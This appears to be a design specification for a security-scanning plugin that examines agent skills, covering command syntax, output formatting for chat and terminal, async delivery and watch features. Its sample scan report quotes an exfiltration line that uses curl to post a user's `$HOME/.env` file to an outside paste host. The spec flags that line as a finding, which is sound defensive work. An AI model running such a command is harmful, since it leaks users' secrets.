## 1. Slash-command UX

### 1.1 Argument grammar [D]

One registered command (`xray`) with subcommands; thin wrapper over the same engine calls as the
CLI verbs (§11.1). Target resolution order everywhere: installed-skill name
(`~/.hermes/skills/<category>/<name>/`, category optional in the grammar) → local dir → zip path
→ git URL → single SKILL.md. Unknown verb or no args ⇒ short usage block (never silent-None).

```
/xray                                  → usage card (≤15 lines)
/xray scan <name|path|url> [--profile street|lab] [--json] [--redact-paths] [--osv]
/xray report [name]                    → latest cached report for an installed skill
/xray diff <name> [<old>]              → report-vs-report or vs previous cached scan
/xray autopsy <name> [--voice clinical|radiology]
/xray doctor
/xray map <name|path>
/xray baseline <name> --reason "…" [--expires DATE]
/xray explain-rules [--rule ID]
/xray watch [status]                   → status/pull only; lifecycle owned by plugin (§5)
/xray card <name>                      → writes SVG share card, returns file path
/xray bones                            → hidden easter egg (fenced art)
```

Rules:

- Flags are the CLI's flags, parsed identically (same argparse spec reused); unknown flag ⇒
  usage line naming the offending flag.
- `--json` always returns the canonical `report/1` envelope in a fenced ```json block (machine
  consumption from chat is a first-class case; byte-identical determinism applies).
- Verbs that cannot finish fast are queued, never blocking (see 1.3).

### 1.2 Output contract per surface [D]

Because one string serves all surfaces (H2), the renderer emits a **surface-neutral core**
(fenced plain text, ≤ ~120 cols) plus optional ANSI color that terminal renderers keep and chat
platforms harmlessly show as-is... except ANSI escapes would litter Discord. Therefore:

**Decision:** `/xray` returns **no ANSI at all** — Unicode box-drawing + fenced blocks only.
Color lives exclusively in the CLI-verb path (`hermes xray …` via `register_cli_command`,
Rich Console, full §12.1 panel, H10/H11). Rationale: the same handler output must be clean on
Slack mrkdwn and MarkdownV2-fallback; ANSI-in-terminal is a nice-to-have, cross-platform garbage
is a real cost.

Budgets:

- Chat target: **≤1800 chars total** so even a header line survives the 1900-char split reserve;
  if the compact report exceeds that, truncate to top 3 active findings + "full report: `<path>`".
- Terminal target: full detail allowed up to ~60 lines inline; longer outputs (autopsy, map,
  `--show-suppressed`) print head + write the whole thing to
  `<plugin-data>/xray/reports/<name>-<hash8>.txt` and print the path.
- Never rely on pipe tables (H5-Slack). Use aligned plain rows inside a fence instead.
- Spoiler blocks (`||…||`) are a **Discord-only progressive enhancement behind config**
  (`plugins.entries.xray.settings.discord_spoilers: false` default): wrap finding snippets in
  spoilers so evidence lines don't auto-expand in busy channels. G4 redaction still applies
  underneath; spoilers are courtesy, not redaction.

### 1.3 Async delivery: cold scan on the worker thread [D]

Trigger contract (§11.4): fast-path cache hit answers synchronously (<200 ms, H3-safe). Cache
miss ⇒ enqueue on the plugin-owned worker thread and answer with a queued notice. Delivery of
the finished report, by surface:

| Surface | Queue-time notice | Ready-time delivery |
| --- | --- | --- |
| CLI interactive session | returned one-liner (mockup B) | worker thread prints delivered summary directly (H13 precedent: 💾 background-review summaries) |
| Any session, pull | same one-liner | `/xray report <name>` returns it; any later `/xray` invocation prepends `1 report ready: <name> (scanned 14:02:11)` until fetched |
| Agent-mediated install (in-session) | `transform_tool_result` on `skill_manage` appends the sober queued line (H8, security-guidance pattern) so the model tells the user | model relays on request; poller/watch delta may also surface it next turn via the same transform channel |
| Gateway push | n/a | **Not available in v0.9** (H13): documented limitation. Durable NDJSON event log in `<plugin-data>/xray/events.ndjson`; stretch goal: opt-in cron-style delivery target reusing DeliveryRouter internals if the owner elects the coupling |

State machine: `queued → scanning → ready|failed`, persisted in `<plugin-data>/xray/jobs.json`;
coalescing keyed by bundle_hash (double-scan avoidance §11.4); failed jobs say why in one line
and never retry silently.

## 2. Fast-path one-liner (lifecycle / post-tool-call triggers)

Hard rules: single line; sober only (FUN.md hard rule — nothing themed ever appears here);
≤160 chars; ASCII punctuation; ends with a pull pointer. Statuses: `ok` (cache hit),
`scan` (queued cold), `fail`, `skip` (watcher/lifecycle coalesced).

```
[A — cache hit]
xray ok web-design-guidelines · B 82/100 · notice · 1 warn 1 note · cached 12s ago · /xray report

[B — cold queued]
xray scan queued: new-skill@main · sha256 9f2ca41e · p95 400ms · /xray report new-skill when ready

[C — coalesced (watcher already covered this hash)]
xray skip web-design-guidelines · unchanged since last exam (14:02:11)

[D — engine/orchestrator error]
xray fail web-design-guidelines · unreadable target: scripts/ (permission denied) · /xray doctor
```

Field order is fixed and machine-greppable: `xray <status> <name> · <facts…> · <pointer>`.
Delivery channels: appended via `transform_tool_result(skill_manage)` (H8), printed by the
worker thread on completion in CLI sessions, and written to `events.ndjson` everywhere.
`on_skill_lifecycle` alone (fire-and-forget, H6) gets the ndjson record + queue side effect;
its user-visible twin arrives through the post-tool-call transform or the next pull.

## 3. Report format deltas: TTY mockup vs Rich/Discord reality

The §12.1 box survives in two places: `hermes xray scan` (Rich Panel, H10 style:
`border_style` mapped grade A/B=green·blue, C/D=yellow, F=red, clean=dim) and the terminal-side
of `/xray` (same drawing, rendered as plain Unicode without Rich markup, since `_cprint` parses
ANSI not Rich tags). For chat surfaces (H4/H5) the full box wastes the 1900-char budget and
alignment dies outside fences — so chat gets the **compact variant**, always inside one fence:

```
[terminal — hermes xray scan / /xray scan in CLI session]
┌─ SKILL X-RAY ───────────────────────────── xray 0.9.0 · pack 2026.08.1 ─┐
│ patient   web-design-guidelines (@vercel-labs/agent-skills)             │
│ bundle    sha256:9f2c…a41 · 6 files · 38 KB · policy: street            │
│ GRADE B 82/100 · NOTICE · capabilities net.read fs.write exec.shell     │
│ ! WARN XRY-NET-011 posts data externally                                │
│     ↳ scripts/sync.sh:42  curl -s -d @"$HOME/.env" https://paste.ex/u   │
│       network.send · UNDECLARED · conf 0.93                             │
│ ○ NOTE XRY-OBS-002 base64 blob decoded at runtime ↳ install.py:17       │
│ advisor only — xray never blocks installs. clean scan ≠ safe skill.     │
│ next: /xray autopsy web-design-guidelines                               │
└──────────────────────────────────────────────────────────────────────────┘

[chat — /xray scan via gateway, fenced block, ≤1200 chars]
SKILL X-RAY 0.9.0 · pack 2026.08.1
patient : web-design-guidelines (@vercel-labs/agent-skills)
bundle  : sha256:9f2c…a41 · 6 files · 38 KB · policy street
grade   : B 82/100 · verdict NOTICE
caps    : net.read · fs.write · exec.shell (declared 2/3)

! WARN XRY-NET-011 posts data externally
      scripts/sync.sh:42 — network.send · UNDECLARED · conf 0.93
○ NOTE XRY-OBS-002 base64 blob decoded at runtime — install.py:17

advisor only — xray never blocks installs. clean scan ≠ safe skill.
next: /xray autopsy web-design-guidelines · /xray report (full)
```

Transformation table (TTY → chat): outer box → fence; snippet column capped 80 cols; score-math
line dropped (`--json .score_math` remains the audit path; `/xray explain-rule` on demand);
next-steps trimmed to ≤2; suppressed findings never shown in chat regardless of flags beyond
top-level count. Multi-chunk safety: because everything is fenced, the Hermes chunker re-opens
fences with `(n/m)` markers (H4) — no special handling needed in the plugin.

## 4. Doctor: in-session vs CLI

One check engine (§11.2's seven checks), two renderers:

- **CLI (`hermes xray doctor`)**: numbered checklist, Rich panels for the summary stamp, real
  exit codes (0 ok/warnings, 2 total failure per §18 — slash output can't carry exit codes, so
  the verdict travels in text there).
- **In-session (`/xray doctor`)**: same checks run in-process; final line carries the verdict:
  `doctor: OK (2 warnings) · profile street · pack 2026.08.1 ✓`. The hook-wiring audit (check 5,
  fails loudly on any blocking xray wiring) is the most valuable check in-session and runs
  identically. Two environment-honest degradations: the socket-deny self-test (check 6) runs
  its canned scan in-process and, where seccomp/namespaces aren't available (macOS, Termux),
  reports `config-audit only` instead of pretending; the synthetic lifecycle self-test (check 4)
  emits a canary skill-name event and asserts X-Ray's own hook saw it — safe because observers
  are best-effort and side-effect-free (H6).
- Doctor results also land in `events.ndjson` so gateway operators can audit without a TTY.

## 5. Watch/notification UX without a daemon

Ownership model [D]: the poller thread is owned by whichever process loaded the plugin (an
interactive CLI process or the gateway process); its lifetime equals that process's lifetime.
There is no daemon and v0.9 ships none.

- Continuous hash-polling (2 s → 30 s adaptive backoff per D-WATCHPOLL, inotify as accelerator,
  debounce 500 ms) is **opt-in**: `/xray watch start` or config `watch.poll: true`.
- A **startup sweep always runs** (single cheap pass comparing persisted bundle hashes): this is
  what catches out-of-band drift even for users who never opt into continuous polling.
- Across session ends: the thread dies with the process; nothing is lost because state persists
  in `<plugin-data>/xray/watch-state.json` (hashes, last-exam times) and every delta appends to
  `events.ndjson`. Next process start replays the gap once:

```
xray watch: while away — 3 changes, 1 regression
  tools/web-design-guidelines  CHANGED  9f2c…a41→b7e0…
    new: XRY-NET-011 HIGH  scripts/sync.sh:42 posts data externally
    grade B(82)→F(25) · verdict notice→alert        ← surfaced via watch-state replay
```

- In CLI sessions, live deltas print from the poller thread (H13 pattern); in gateway processes
  they accumulate and surface on pull (`/xray watch status`, next `/xray` invocation banner) —
  same honest limitation as 1.3, same stretch-goal fix.
- Coalescing with lifecycle triggers stays hash-keyed (§11.4): watcher-reported hashes make the
  lifecycle fast path emit `skip` (mockup C above).

## 6. FUN feature translation matrix (default sober, opt-in fun)

FUN.md's hard rule binds every cell: default output identical and sober; fun behind explicit
flags; automation surfaces permanently sober. Slash/chat adds one new axis the FUN doc didn't
have: **the surface renders as a returned string** — anything animated or file-shaped needs a
fallback.

| FUN feature | CLI/Tty | `/xray` slash (terminal) | Gateway chat | Verdict |
| --- | --- | --- | --- | --- |
| F-1 autopsy voices | clinical default; radiology flag | same, prose-only | radiology reads fine as chat prose | ✅ translates; noir stays deferred (Q10) |
| F-2 share cards `--card --svg` | renders/exports SVG | writes to `<plugin-data>/xray/cards/<name>.svg`, returns path | **path only** — plugins have no adapter handle to attach files (H13); Discord user attaches manually | ⚠️ partial in v0.9; revisit with media pipeline |
| F-3 grade reveal `--develop` | TTY-only animation, skippable | never (return-str surface can't animate; silently inert like non-TTY) | never | ✅ CLI-only by design, matches FUN guardrails |
| F-4 fluoroscope sweep `--animate` | TTY-only, ≤10 fps | never | never (static spinner max) | ✅ CLI-only |
| F-5 playground patient | `hermes xray playground` | returns copy instructions | same, one-liner | ✅ translates trivially |
| F-6 `bones` / self-scan | hidden verbs | `/xray bones` returns fenced anatomical chart ≤1900 chars | same art in fence renders perfectly | ✅ translates; self-scan grade line stays sober-formatted |
| F-7 canary lore line | post-1.0; informative line | same | same | ✅ survives anywhere precisely because it's informative |
| Grade stamps/posters as images in chat | n/a | path pointer | see F-2 | deferred with F-2 |

Share-card Discord dream (inline image embeds) requires either a `register_platform`-adjacent
media API or a delivery-target integration — recorded as the v1.0 stretch alongside the
DeliveryRouter option, not promised.
